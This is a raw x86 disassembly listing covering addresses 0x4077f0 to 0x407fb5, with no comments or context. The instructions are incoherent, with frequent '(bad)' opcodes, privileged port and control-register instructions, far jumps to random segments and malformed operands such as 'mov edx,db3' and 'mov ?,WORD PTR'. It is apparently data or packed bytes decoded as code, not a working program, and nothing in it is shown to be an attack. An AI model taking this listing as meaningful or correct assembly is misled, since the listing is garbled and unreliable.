  4077f0:	stos   BYTE PTR es:[edi],al
  4077f1:	test   al,0xb1
  4077f3:	je     0x4077dd
  4077f5:	dec    esp
  4077f6:	call   0xfadf7eb3
  4077fb:	mov    esp,0x419a6a7e
  407800:	(bad)  
  407801:	(bad)  
  407802:	dec    edi
  407803:	retf   
  407804:	sbb    eax,0x302ba18f
  407809:	pop    edx
  40780a:	scas   eax,DWORD PTR es:[edi]
  40780b:	jl     0x4077fd
  40780d:	(bad)  
  40780e:	mov    cl,0xe6
  407810:	(bad)  [esi-0x47]
  407813:	jmp    0x4077cb
  407815:	xor    BYTE PTR [eax-0x75],dl
  407818:	in     al,dx
  407819:	imul   ecx,DWORD PTR ds:[eax-0x4f80eb40],0x22
  407821:	sub    BYTE PTR [esi+eiz*2],cl
  407824:	jecxz  0x4077d3
  407826:	daa    
  407827:	cmc    
  407828:	mov    ebp,0xcbfde138
  40782d:	cmc    
  40782e:	jmp    0x495a027a
  407833:	sub    DWORD PTR [ebp+0x3b9e20ec],ebp
  407839:	aas    
  40783a:	jne    0x407826
  40783c:	mov    edx,db3
  40783f:	jmp    0x40789a
  407841:	and    al,ah
  407843:	mov    ?,WORD PTR [ebp+0x1a403c8a]
  407849:	pop    ss
  40784a:	sbb    ah,dl
  40784c:	hlt    
  40784d:	fs and eax,0xbfda4dd3
  407853:	cmp    esp,eax
  407855:	stc    
  407856:	mov    esi,0xae957684
  40785b:	rcr    esp,cl
  40785d:	jl     0x40780f
  40785f:	pop    esp
  407860:	adc    DWORD PTR [ecx+esi*1-0x2db172ba],0x303aaa3c
  40786b:	pop    edx
  40786c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40786d:	cdq    
  40786e:	arpl   WORD PTR [eax],bx
  407870:	pop    ebx
  407871:	mov    cl,0x72
  407873:	fwait
  407874:	push   esp
  407875:	fcmovbe st,st(0)
  407877:	out    0x70,al
  407879:	ins    DWORD PTR es:[edi],dx
  40787a:	gs pop ebp
  40787c:	gs cmp eax,0x18856da
  407882:	ds xor eax,0x5dd4eb41
  407888:	xor    ah,dl
  40788a:	dec    esi
  40788b:	push   esi
  40788c:	out    0xb8,eax
  40788e:	jl     0x40782c
  407890:	mov    ebp,0xc77b8c67
  407895:	inc    esp
  407896:	not    ecx
  407898:	adc    BYTE PTR [esi+0x53],cl
  40789b:	ret    
  40789c:	xchg   esi,eax
  40789d:	lds    edx,FWORD PTR [eax-0x10cd5589]
  4078a3:	in     al,dx
  4078a4:	jmp    0xf7b8ef0
  4078a9:	daa    
  4078aa:	add    eax,DWORD PTR [eax-0x362ab1e5]
  4078b0:	cmp    ch,bl
  4078b2:	adc    al,0x2d
  4078b4:	push   ebx
  4078b5:	into   
  4078b6:	adc    BYTE PTR [esi],bh
  4078b8:	sub    al,0x2c
  4078ba:	call   0x8d3fb733
  4078bf:	in     eax,0x10
  4078c1:	arpl   sp,si
  4078c3:	mov    eax,0x6845c7eb
  4078c8:	mov    al,ds:0x2f62046a
  4078cd:	pop    edx
  4078ce:	cmp    esp,DWORD PTR [edx+0x3d]
  4078d1:	mov    ch,0xf4
  4078d3:	jbe    0x40788a
  4078d5:	test   BYTE PTR [esp+edx*4-0x68f7bf96],ch
  4078dc:	and    eax,0xf4ed7ba8
  4078e1:	in     eax,dx
  4078e2:	jmp    0x164d0b8d
  4078e7:	push   es
  4078e8:	cmp    DWORD PTR [esi+0x5c29fa3c],ecx
  4078ee:	sub    BYTE PTR ds:0x6438cb70,ah
  4078f4:	add    eax,0x339a378a
  4078f9:	mov    al,0xae
  4078fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4078fc:	xchg   esp,eax
  4078fd:	dec    ebx
  4078fe:	in     eax,0x45
  407900:	aas    
  407901:	in     eax,0xcc
  407903:	add    DWORD PTR [ecx-0x4db05c62],0xffffffc9
  40790a:	push   ebp
  40790b:	adc    ecx,DWORD PTR [esi+0x72]
  40790e:	jne    0x407964
  407910:	ins    DWORD PTR es:[edi],dx
  407911:	cld    
  407912:	pop    esp
  407913:	jnp    0x4078ba
  407915:	enter  0xd080,0x57
  407919:	pop    ebx
  40791a:	hlt    
  40791b:	push   ds
  40791c:	repz xlat BYTE PTR ds:[ebx]
  40791e:	dec    esp
  40791f:	xlat   BYTE PTR ds:[ebx]
  407920:	test   DWORD PTR [esi+0x40be8bf4],esp
  407926:	mov    DWORD PTR [ecx+0x6b534147],edx
  40792c:	jp     0x407906
  40792e:	daa    
  40792f:	pop    ss
  407930:	jecxz  0x407997
  407932:	xor    al,BYTE PTR [ecx+0x274ec7f8]
  407938:	xor    BYTE PTR [eax],ch
  40793a:	cs inc edx
  40793c:	out    dx,al
  40793d:	lds    ebp,FWORD PTR [ebx-0x733a6b66]
  407943:	mov    esp,0x7905a7e0
  407948:	mov    WORD PTR ds:[ebx-0x7c14face],cs
  40794f:	ficomp DWORD PTR [ebx]
  407951:	lods   eax,DWORD PTR ds:[esi]
  407952:	jnp    0x4079a1
  407954:	push   esi
  407955:	inc    edx
  407956:	in     al,dx
  407957:	out    0xf2,eax
  407959:	adc    al,0x9b
  40795b:	mov    edx,0x11c14d70
  407960:	sbb    esi,0x5d465e14
  407966:	imul   eax,esp,0xfffffffe
  407969:	out    0x1d,eax
  40796b:	jle    0x40791e
  40796d:	cmp    bh,ch
  40796f:	(bad)  
  407970:	je     0x407900
  407972:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407973:	loopne 0x4079a0
  407975:	jl     0x40795c
  407977:	div    BYTE PTR [esi]
  407979:	add    BYTE PTR [ebx-0x59d598c7],0xc4
  407980:	push   ebp
  407981:	adc    ebx,DWORD PTR [esi+0x6e4b76e1]
  407987:	shl    DWORD PTR [edx-0x2a],1
  40798a:	cwde   
  40798b:	sti    
  40798c:	mov    eax,0x50c0193d
  407991:	mov    bh,0xc3
  407993:	inc    eax
  407994:	jl     0x4079c7
  407996:	xor    eax,0x6f51083
  40799b:	jp     0x40797f
  40799d:	pusha  
  40799e:	mov    ds:0xb5897ef3,eax
  4079a3:	pop    esi
  4079a4:	aad    0x27
  4079a6:	push   cs
  4079a7:	fld    st(2)
  4079a9:	cmc    
  4079aa:	adc    eax,0x7f0ab6e1
  4079af:	call   0x5572:0xb29ad9dc
  4079b6:	mov    edi,0xc1934354
  4079bb:	adc    eax,0x12399e19
  4079c0:	lods   eax,DWORD PTR ds:[esi]
  4079c1:	jl     0x4079b3
  4079c3:	(bad)  
  4079c5:	sub    ah,BYTE PTR [edx]
  4079c7:	call   0x32e9:0x7de2b7b3
  4079ce:	icebp  
  4079cf:	xchg   esi,eax
  4079d0:	outs   dx,BYTE PTR ds:[esi]
  4079d1:	inc    esi
  4079d2:	ja     0x40797d
  4079d4:	cmp    eax,0xce5745e
  4079d9:	sub    BYTE PTR [ebx+eax*4+0x7c],ch
  4079dd:	push   ebp
  4079de:	(bad)
  4079e1:	and    DWORD PTR [ebp+0x62770d5f],edi
  4079e7:	jmp    0xfb71:0xc6035086
  4079ee:	arpl   ax,dx
  4079f0:	inc    ebx
  4079f1:	xchg   BYTE PTR [ebx+0x75],bl
  4079f4:	sbb    al,0x66
  4079f6:	jns    0x4079e8
  4079f8:	aad    0xad
  4079fa:	sbb    al,0xfc
  4079fc:	(bad)  
  4079fd:	out    dx,eax
  4079fe:	fxam   
  407a00:	cld    
  407a01:	mov    dl,0x42
  407a03:	cmp    edi,DWORD PTR [ebp-0x3af79e3]
  407a09:	test   eax,0xad854430
  407a0e:	mov    al,ds:0x966b43d2
  407a13:	enter  0x2844,0x6a
  407a17:	in     eax,0x4a
  407a19:	adc    eax,0x7101b51e
  407a1e:	adc    eax,0xa9d74aaf
  407a23:	mov    ah,0x60
  407a25:	rcr    DWORD PTR fs:[edi+0x7d],0x39
  407a2a:	sbb    eax,0x56faac8e
  407a2f:	dec    esi
  407a30:	imul   edi,DWORD PTR [ebp-0x770c106d],0x2c
  407a37:	xchg   esp,eax
  407a38:	add    eax,0x190942ea
  407a3d:	jnp    0x4079ef
  407a3f:	push   edx
  407a40:	or     eax,0x37065757
  407a45:	imul   ecx,esp,0xffffffa7
  407a48:	neg    BYTE PTR [esi-0x14]
  407a4b:	ret    
  407a4c:	test   BYTE PTR [ebp-0x7701ed66],al
  407a52:	mov    ecx,0xff6ba7f9
  407a57:	xchg   edx,eax
  407a58:	aas    
  407a59:	fist   WORD PTR [ebx-0x29]
  407a5c:	cmp    al,0x29
  407a5e:	push   es
  407a5f:	lahf   
  407a60:	push   ebp
  407a61:	and    dl,BYTE PTR [eax+edx*2+0x4c]
  407a65:	ins    BYTE PTR es:[edi],dx
  407a66:	sub    bh,bh
  407a68:	(bad)
  407a6b:	inc    ecx
  407a6c:	xor    ah,dh
  407a6e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407a6f:	mov    ds:0x7c6ece3b,al
  407a74:	out    dx,al
  407a75:	dec    esp
  407a76:	inc    ebp
  407a77:	inc    edx
  407a78:	stos   BYTE PTR es:[edi],al
  407a79:	int    0x56
  407a7b:	idiv   DWORD PTR [edx+0x550f721b]
  407a81:	loopne 0x407a9f
  407a83:	jo     0x407aaf
  407a85:	push   edi
  407a86:	stc    
  407a87:	fidivr DWORD PTR [ecx-0x5f]
  407a8a:	jmp    0xc6364d06
  407a8f:	pop    eax
  407a90:	dec    esp
  407a91:	leave  
  407a92:	cmp    eax,0xeb312541
  407a97:	and    dh,BYTE PTR [edx+0x59]
  407a9a:	shr    BYTE PTR [edx],1
  407a9c:	jp     0x407aad
  407a9e:	cmp    eax,0x17a0c33
  407aa3:	imul   ebp,DWORD PTR [eax-0x20461f92],0xdd4892c5
  407aad:	push   edx
  407aae:	js     0x407a5b
  407ab0:	in     al,0x32
  407ab2:	inc    eax
  407ab3:	(bad)  
  407ab4:	jns    0x407aa7
  407ab6:	and    DWORD PTR [ecx+eax*8],edx
  407ab9:	in     al,0xba
  407abb:	sub    edx,ebx
  407abd:	pop    ebx
  407abe:	aam    0x8e
  407ac0:	cmp    esi,DWORD PTR [ebx-0x70]
  407ac3:	pusha  
  407ac4:	adc    DWORD PTR [edi-0x2],ecx
  407ac7:	btr    edi,0x81
  407acb:	aam    0x1
  407acd:	inc    edx
  407ace:	sub    BYTE PTR [esi],cl
  407ad0:	cmp    dl,BYTE PTR [ebp+0x3c]
  407ad3:	lods   eax,DWORD PTR ds:[esi]
  407ad4:	jne    0x407b0d
  407ad6:	add    esp,ebx
  407ad8:	mov    bl,0x30
  407ada:	xor    eax,0xf945a186
  407adf:	ja     0x407ac8
  407ae1:	sub    al,0xb9
  407ae3:	or     ah,cl
  407ae5:	sbb    BYTE PTR [eax+0x69],dh
  407ae8:	mov    eax,0xc8e85669
  407aed:	jb     0x407b3c
  407aef:	push   esi
  407af0:	xchg   BYTE PTR [esi+ebx*8],dl
  407af3:	scas   al,BYTE PTR es:[edi]
  407af4:	(bad)  
  407af6:	fwait
  407af7:	jno    0x407b4d
  407af9:	adc    cl,BYTE PTR [eax+0x2dfde894]
  407aff:	add    ah,BYTE PTR [ecx+0x21]
  407b02:	push   edx
  407b03:	xor    BYTE PTR [eax-0x79],dh
  407b06:	sub    BYTE PTR [ebx],ch
  407b08:	and    ch,0xfb
  407b0b:	inc    dl
  407b0d:	and    al,0xa7
  407b0f:	popf   
  407b10:	sti    
  407b11:	fsubr  DWORD PTR [ebx-0x4314bde0]
  407b17:	clc    
  407b18:	xor    BYTE PTR [esi],dl
  407b1a:	(bad)  
  407b1b:	inc    esi
  407b1c:	aaa    
  407b1d:	mov    eax,DWORD PTR [edi+0x5b]
  407b20:	clc    
  407b21:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407b22:	xor    BYTE PTR [esi+0x27f1cb8],al
  407b28:	je     0x407b24
  407b2a:	dec    ebp
  407b2b:	pop    ss
  407b2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b2d:	inc    ebp
  407b2e:	dec    ecx
  407b2f:	cmp    al,0x31
  407b31:	xchg   edx,eax
  407b32:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407b33:	fsubr  QWORD PTR [ebx-0x7c133bfb]
  407b39:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b3a:	test   DWORD PTR [esi],eax
  407b3c:	mov    dh,0x78
  407b3e:	jbe    0x407b65
  407b40:	xchg   BYTE PTR [edx+edi*8+0x41],bl
  407b44:	mov    ah,BYTE PTR [ebx+ebp*1+0x3b20c8e8]
  407b4b:	int    0x81
  407b4d:	(bad)  
  407b4e:	ss out dx,eax
  407b50:	in     eax,0x94
  407b52:	adc    eax,0x258318ca
  407b57:	mov    esp,0xb4b227bd
  407b5c:	cmp    ebx,ebp
  407b5e:	shl    BYTE PTR [eax-0x53],0x8a
  407b62:	ja     0x407b4e
  407b64:	add    eax,0xa96d300a
  407b69:	dec    edi
  407b6a:	popf   
  407b6b:	test   DWORD PTR [ebx],ebx
  407b6d:	smsw   esp
  407b70:	or     BYTE PTR [eax],cl
  407b72:	je     0x407bf0
  407b74:	mov    eax,edi
  407b76:	sub    ch,BYTE PTR [eax+ebx*1]
  407b79:	pop    esi
  407b7a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407b7b:	call   0xd3a3:0xb66c5a3f
  407b82:	sub    edi,DWORD PTR ds:0x3c9cd9c6
  407b88:	daa    
  407b89:	ins    DWORD PTR es:[edi],dx
  407b8a:	imul   ebx,ebp,0xffffffca
  407b8d:	xor    DWORD PTR [ebx+0x139e3ebe],eax
  407b93:	cmp    al,BYTE PTR [esi+0x5ccb73bf]
  407b99:	addr16 pushf 
  407b9b:	(bad)  
  407b9c:	cld    
  407b9d:	call   0xa830:0xa4a93a61
  407ba4:	add    al,0x57
  407ba6:	addr16 das 
  407ba8:	lods   al,BYTE PTR ds:[esi]
  407ba9:	nop
  407baa:	(bad)  [edx+0x6cb898a4]
  407bb0:	out    0x34,eax
  407bb2:	lea    edx,[edx]
  407bb4:	inc    ecx
  407bb5:	add    DWORD PTR [esi+edi*4-0x2],edi
  407bb9:	test   DWORD PTR [eax-0x343fb1e3],ebp
  407bbf:	sbb    edx,edx
  407bc1:	xchg   ebx,eax
  407bc2:	sbb    BYTE PTR [edx+0x3c],cl
  407bc5:	stc    
  407bc6:	repz dec ebx
  407bc8:	not    DWORD PTR [ecx]
  407bca:	xlat   BYTE PTR ds:[ebx]
  407bcb:	fdiv   DWORD PTR [esi+0x7ee795eb]
  407bd1:	jecxz  0x407b62
  407bd3:	adc    DWORD PTR [edi-0x53],edx
  407bd6:	xchg   esp,eax
  407bd7:	lods   al,BYTE PTR ds:[esi]
  407bd8:	call   0xd929d33e
  407bdd:	and    BYTE PTR [edx+ebp*2+0x33],0xca
  407be2:	ins    BYTE PTR es:[edi],dx
  407be3:	inc    eax
  407be4:	loopne 0x407be3
  407be6:	sub    cl,BYTE PTR [ebx-0x130c213]
  407bec:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407bed:	or     DWORD PTR [ecx-0x1d],eax
  407bf0:	pusha  
  407bf1:	mov    ebp,0x4e2664d3
  407bf6:	xchg   ecx,eax
  407bf7:	(bad)  
  407bf8:	je     0x407ba9
  407bfa:	loope  0x407c40
  407bfc:	rcr    DWORD PTR [ebp-0x1d],0xc1
  407c00:	xchg   esi,eax
  407c01:	and    ebx,DWORD PTR [ecx]
  407c03:	nop
  407c04:	bound  edx,QWORD PTR [eax+0x49]
  407c07:	push   esi
  407c08:	or     cl,BYTE PTR [eax+0x62]
  407c0b:	mov    eax,ds:0x819df70f
  407c10:	inc    edx
  407c11:	int    0xb2
  407c13:	and    esp,DWORD PTR [ebp+edx*1+0x36]
  407c17:	add    BYTE PTR [edi+0x69],al
  407c1a:	jmp    0xab0f18a3
  407c1f:	clc    
  407c20:	xlat   BYTE PTR ds:[ebx]
  407c21:	imul   edi,eax,0xd
  407c24:	or     ebx,DWORD PTR [eax+0x4]
  407c27:	in     eax,0x84
  407c29:	mov    BYTE PTR [ecx+eax*2+0x6e12cf85],dl
  407c30:	xor    DWORD PTR [ecx+edx*8-0x2c],0x868de388
  407c38:	sbb    esp,esi
  407c3a:	imul   edi,DWORD PTR [eax],0x6
  407c3d:	lock mov ecx,0x72c85ad1
  407c43:	lahf   
  407c44:	enter  0xf9ca,0xc
  407c48:	shl    DWORD PTR [ebp+0x14],1
  407c4b:	clc    
  407c4c:	mov    DWORD PTR [esi-0x7dd7a8],ebx
  407c52:	xchg   edx,eax
  407c53:	sub    DWORD PTR [edx+esi*8],edi
  407c56:	out    dx,al
  407c57:	lods   eax,DWORD PTR ds:[esi]
  407c58:	out    0x4e,al
  407c5a:	pusha  
  407c5b:	mov    al,ds:0x2700f81e
  407c60:	popa   
  407c61:	cmp    eax,0x8c0cb617
  407c66:	and    DWORD PTR [edi+0x4f0e9a05],edx
  407c6c:	stos   BYTE PTR es:[edi],al
  407c6d:	push   ss
  407c6e:	sti    
  407c6f:	xchg   edi,eax
  407c70:	add    eax,0x86194ec5
  407c75:	jbe    0x407c37
  407c77:	sub    ebp,DWORD PTR [esi+0x7a881e97]
  407c7d:	mov    ds:0xf0a9604e,eax
  407c82:	dec    ebx
  407c83:	in     eax,dx
  407c84:	nop
  407c85:	inc    ebx
  407c86:	fucomp st(7)
  407c88:	mov    ds:0xd42d34fa,al
  407c8d:	ror    DWORD PTR [edx+0x66],cl
  407c90:	pop    esp
  407c91:	les    edx,FWORD PTR [esi-0x7b]
  407c94:	pop    eax
  407c95:	adc    esi,DWORD PTR [ebp+0x7a3eb148]
  407c9b:	mov    esp,0x6ea65472
  407ca0:	mov    edi,0x8decfb91
  407ca5:	aas    
  407ca6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407ca7:	add    al,0x9d
  407ca9:	arpl   WORD PTR [ebx-0x3b523fbc],bx
  407caf:	cli    
  407cb0:	inc    esi
  407cb1:	pop    ds
  407cb2:	sti    
  407cb3:	in     eax,0x17
  407cb5:	nop
  407cb6:	into   
  407cb7:	jo     0x407ceb
  407cb9:	mov    ch,0xe6
  407cbb:	jmp    0x7ec84c6e
  407cc0:	jns    0x407cfa
  407cc2:	mov    edi,DWORD PTR [edi]
  407cc4:	ficom  WORD PTR [esi-0x7a8647fe]
  407cca:	push   cs
  407ccb:	loope  0x407ce3
  407ccd:	stos   DWORD PTR es:[edi],eax
  407cce:	loop   0x407cf3
  407cd0:	(bad)  
  407cd1:	xchg   ebx,eax
  407cd2:	add    DWORD PTR [edi-0x6918ec6c],0x55
  407cd9:	jnp    0x407d1b
  407cdb:	aam    0xa8
  407cdd:	add    al,BYTE PTR [eax+0x2e]
  407ce0:	loope  0x407c63
  407ce2:	inc    ecx
  407ce3:	retf   0x974d
  407ce6:	(bad)  
  407ce7:	not    DWORD PTR [ebx+0x381b13b4]
  407ced:	push   ss
  407cee:	sti    
  407cef:	outs   dx,BYTE PTR ds:[esi]
  407cf0:	and    bl,0x92
  407cf3:	pop    ds
  407cf4:	xor    DWORD PTR [edi],0xfffffff6
  407cf7:	shl    DWORD PTR [ebx+edi*4],1
  407cfa:	(bad)  
  407cfb:	dec    edi
  407cfc:	popf   
  407cfd:	mov    edi,0x77f04232
  407d02:	mov    esp,0xda0da2e0
  407d07:	mov    gs,esp
  407d09:	cmp    al,0x9f
  407d0b:	and    eax,DWORD PTR [eax]
  407d0d:	in     eax,dx
  407d0e:	cmp    dh,0xf3
  407d11:	pop    edx
  407d12:	inc    ax
  407d14:	hlt    
  407d15:	push   es
  407d16:	sub    ebx,DWORD PTR [eax+0x187c5dce]
  407d1c:	jmp    0x407cb5
  407d1e:	cmp    DWORD PTR [ecx-0x30],ecx
  407d21:	stos   DWORD PTR es:[edi],eax
  407d22:	cdq    
  407d23:	and    al,0x5f
  407d25:	push   edx
  407d26:	ficom  WORD PTR [ebp+0x35741f4b]
  407d2c:	jae    0x407cd7
  407d2e:	add    ebp,DWORD PTR [ebx-0x5dc5cda0]
  407d34:	sub    ebp,0xffffffb8
  407d37:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d38:	inc    eax
  407d39:	pop    esi
  407d3a:	or     eax,0xc2bb9e64
  407d3f:	lods   eax,DWORD PTR ds:[esi]
  407d40:	push   ecx
  407d41:	sub    esi,DWORD PTR [ebp+0x3db6e91e]
  407d47:	int    0x72
  407d49:	lods   eax,DWORD PTR ds:[esi]
  407d4a:	push   eax
  407d4b:	dec    ecx
  407d4c:	mov    ebp,DWORD PTR [edi*4+0x7b79bac]
  407d53:	loop   0x407dc9
  407d55:	retf   0xed81
  407d58:	pop    esi
  407d59:	arpl   WORD PTR [edi],dx
  407d5b:	jns    0x407d24
  407d5d:	(bad)  ds:0x277ebd4d
  407d63:	aad    0xe8
  407d65:	(bad)  
  407d66:	std    
  407d67:	mov    es,ebx
  407d69:	(bad)  
  407d6a:	pop    ecx
  407d6b:	xor    dh,dh
  407d6d:	scas   al,BYTE PTR es:[edi]
  407d6e:	mov    cr4,edx
  407d71:	mov    al,0xc2
  407d73:	mov    ebx,0x44b31f12
  407d78:	sbb    bh,BYTE PTR [esp+ebx*2]
  407d7b:	adc    eax,0x52a120fc
  407d80:	fbld   TBYTE PTR [edi+0x75a45b4d]
  407d86:	ja     0x407da1
  407d88:	imul   esi,DWORD PTR [ecx-0x494c7057],0x8ea94ef2
  407d92:	repnz sti 
  407d94:	sahf   
  407d95:	inc    edi
  407d96:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d97:	inc    esi
  407d98:	lahf   
  407d99:	mov    edx,0xc88cdc25
  407d9e:	dec    esi
  407d9f:	test   BYTE PTR [esi+ebp*2+0x7],cl
  407da3:	or     al,bh
  407da5:	and    dh,ah
  407da7:	adc    al,0x51
  407da9:	add    ebx,ebp
  407dab:	loope  0x407d65
  407dad:	add    eax,0x108f3f71
  407db2:	mov    al,0x1a
  407db4:	mov    dl,0x69
  407db6:	jbe    0x407d94
  407db8:	xor    dl,BYTE PTR [ecx]
  407dba:	jnp    0x407dce
  407dbc:	ins    BYTE PTR es:[edi],dx
  407dbd:	sar    DWORD PTR [edi*2+0x33d108de],cl
  407dc4:	xor    DWORD PTR [esi+0x11],0x97512e58
  407dcb:	inc    edi
  407dcc:	xchg   BYTE PTR ds:0xf603c682,dl
  407dd2:	mov    eax,0xec8a7b1b
  407dd7:	sbb    al,0xd6
  407dd9:	push   es
  407dda:	cmp    dl,ah
  407ddc:	cwde   
  407ddd:	adc    al,BYTE PTR [ecx]
  407ddf:	fistp  WORD PTR [edx]
  407de1:	aaa    
  407de2:	and    al,0xa9
  407de4:	cmp    eax,0x987f1dce
  407de9:	test   BYTE PTR [ebp+0xc],ah
  407dec:	stos   BYTE PTR es:[edi],al
  407ded:	sub    edx,DWORD PTR [ebx-0x54]
  407df0:	or     ebp,ebx
  407df2:	in     al,dx
  407df3:	push   0x28
  407df5:	inc    ecx
  407df6:	jecxz  0x407dca
  407df8:	cmp    BYTE PTR [esi],ah
  407dfa:	out    0x2b,eax
  407dfc:	ror    DWORD PTR [eax-0x2f5fd6d2],1
  407e02:	repz into 
  407e04:	fwait
  407e05:	out    dx,al
  407e06:	loop   0x407e08
  407e08:	fs push ebx
  407e0a:	mov    ds:0xfb1fd2ae,eax
  407e0f:	mul    ecx
  407e11:	push   esi
  407e12:	clc    
  407e13:	pop    ebx
  407e14:	jecxz  0x407e90
  407e16:	fld    TBYTE PTR [ecx]
  407e18:	shufps xmm4,XMMWORD PTR [edi+0x71],0xce
  407e1d:	inc    edi
  407e1e:	mov    ah,0x7c
  407e20:	xchg   ebp,eax
  407e21:	xor    al,BYTE PTR [edx]
  407e23:	in     eax,0xca
  407e25:	in     eax,0xfe
  407e27:	add    DWORD PTR [ebx+0x60539365],esi
  407e2d:	push   ebp
  407e2e:	sbb    DWORD PTR [ecx],ebp
  407e30:	xchg   edx,eax
  407e31:	xchg   ebx,esp
  407e33:	mov    edi,DWORD PTR [ecx+esi*2+0x1b]
  407e37:	add    bh,BYTE PTR ds:0x4797ecc7
  407e3d:	mov    ebx,0xd508d68f
  407e42:	int    0x30
  407e44:	xor    ecx,DWORD PTR [edi-0xa]
  407e47:	idiv   BYTE PTR [ebx+0x107be9a6]
  407e4d:	retf   0xa49c
  407e50:	je     0x407e60
  407e52:	loopne 0x407e1f
  407e54:	mov    eax,ds:0x46b84daa
  407e59:	out    dx,eax
  407e5a:	lahf   
  407e5b:	mov    ecx,DWORD PTR [ebx+0x10]
  407e5e:	hlt    
  407e5f:	and    eax,0xbf19b57e
  407e64:	mov    al,ds:0x1838c5a8
  407e69:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407e6a:	scas   al,BYTE PTR es:[edi]
  407e6b:	repnz xor DWORD PTR [ecx+0x0],ebp
  407e6f:	invd   
  407e71:	fwait
  407e72:	stos   BYTE PTR es:[edi],al
  407e73:	jmp    0x407e4a
  407e75:	xor    ebx,eax
  407e77:	and    eax,0x989b0b41
  407e7c:	dec    edx
  407e7d:	ss mov ecx,0x8cf41ad9
  407e83:	iret   
  407e84:	xor    al,0x83
  407e86:	mov    bl,0xa9
  407e88:	mov    ds:0x4f1ce5ae,eax
  407e8d:	sbb    BYTE PTR [edx],bl
  407e8f:	pop    edi
  407e90:	xor    ah,BYTE PTR [eax]
  407e92:	adc    DWORD PTR [ebp-0x21],ebp
  407e95:	push   0x79
  407e97:	jno    0x407e44
  407e99:	ror    DWORD PTR [edx+0x5b],cl
  407e9c:	push   edi
  407e9d:	je     0x407e31
  407e9f:	les    ebx,FWORD PTR [ecx]
  407ea1:	ror    eax,0x38
  407ea4:	push   ss
  407ea5:	retf   
  407ea6:	adc    BYTE PTR [edi],cl
  407ea8:	(bad)  
  407eaa:	call   0x3ad2:0xadfaf184
  407eb1:	adc    DWORD PTR [ebx+ecx*4],esp
  407eb4:	push   ebp
  407eb5:	add    ch,BYTE PTR [ecx-0x69]
  407eb8:	xor    cl,bl
  407eba:	sub    ebp,DWORD PTR [ecx+0x1a7b966e]
  407ec0:	fisubr WORD PTR [edx+0x74225915]
  407ec6:	or     BYTE PTR [edx-0x42],0xf1
  407eca:	cmc    
  407ecb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407ecc:	jno    0x407f28
  407ece:	ss retf 
  407ed0:	cmp    ecx,DWORD PTR [eax-0x276abcc3]
  407ed6:	jmp    0xfbcb:0xab910ad0
  407edd:	rol    BYTE PTR [eax-0x27d240c6],cl
  407ee3:	aam    0x2c
  407ee5:	data16 jp 0x407ea5
  407ee8:	jmp    0x407f0e
  407eea:	push   esi
  407eeb:	sbb    eax,DWORD PTR ds:0x8c3907d6
  407ef1:	inc    ebx
  407ef2:	mov    eax,0xcbf4506e
  407ef7:	call   0xaeed:0x6613c0c5
  407efe:	xor    eax,0x92bc2a38
  407f03:	pop    ss
  407f04:	ins    DWORD PTR es:[edi],dx
  407f05:	sub    eax,0x9a7a0808
  407f0a:	jle    0x407f34
  407f0c:	lods   al,BYTE PTR ds:[esi]
  407f0d:	shr    DWORD PTR [esi],0xa
  407f10:	add    BYTE PTR [ecx-0x41d237ed],bl
  407f16:	sbb    eax,0xa75dd444
  407f1b:	mov    ds:0xab0e5d74,al
  407f20:	(bad)  
  407f21:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  407f23:	pop    ss
  407f24:	mov    DWORD PTR [ecx+0x5f],edi
  407f27:	test   eax,0x66397e1a
  407f2c:	sti    
  407f2d:	je     0x407f40
  407f2f:	into   
  407f30:	aam    0xc2
  407f32:	in     al,0x91
  407f34:	xchg   DWORD PTR [esi],ecx
  407f36:	into   
  407f37:	arpl   WORD PTR [ebx],di
  407f39:	popf   
  407f3a:	sbb    esi,eax
  407f3c:	pushf  
  407f3d:	aad    0xce
  407f3f:	ja     0x407f26
  407f41:	jecxz  0x407efa
  407f43:	idiv   DWORD PTR ss:[edi+0x67]
  407f47:	std    
  407f48:	ffreep st(1)
  407f4a:	jns    0x407f8e
  407f4c:	mov    ch,0xdd
  407f4e:	in     eax,dx
  407f4f:	and    al,0x82
  407f51:	jne    0x407efa
  407f53:	adc    al,0xe9
  407f55:	fbstp  TBYTE PTR [ebx+0xea95f54]
  407f5b:	loopne 0x407f04
  407f5d:	mov    ds:0xdaa69481,eax
  407f62:	mov    al,0x43
  407f64:	inc    ebx
  407f65:	push   esp
  407f66:	ret    0xec79
  407f69:	call   FWORD PTR [edi]
  407f6b:	ficom  DWORD PTR [ebp-0x67]
  407f6e:	sbb    BYTE PTR [edi+0x35],cl
  407f71:	fdiv   DWORD PTR [edi+0x4b03aba9]
  407f77:	aaa    
  407f78:	pop    esi
  407f79:	enter  0x91cd,0x7c
  407f7d:	push   eax
  407f7e:	mov    ch,BYTE PTR [edx-0x7b54d4bb]
  407f84:	ss pop ds
  407f86:	loope  0x407f60
  407f88:	adc    al,0x16
  407f8a:	outs   dx,DWORD PTR ds:[esi]
  407f8b:	jl     0x407f8e
  407f8d:	jb     0x407fbd
  407f8f:	or     BYTE PTR ds:0x536856d6,dh
  407f95:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407f96:	cmp    al,0x3b
  407f98:	lahf   
  407f99:	fs js  0x40801b
  407f9c:	push   es
  407f9d:	xchg   BYTE PTR [edi],bh
  407f9f:	aam    0x8c
  407fa1:	pop    es
  407fa2:	outs   dx,DWORD PTR ds:[esi]
  407fa3:	jb     0x407f7a
  407fa5:	push   es
  407fa6:	stc    
  407fa7:	(bad)  
  407fa9:	xchg   esi,eax
  407faa:	push   0x1878ea93
  407faf:	mov    WORD PTR [ebx-0x453f18ee],?
  407fb5:	mov    eax,0x92b1464
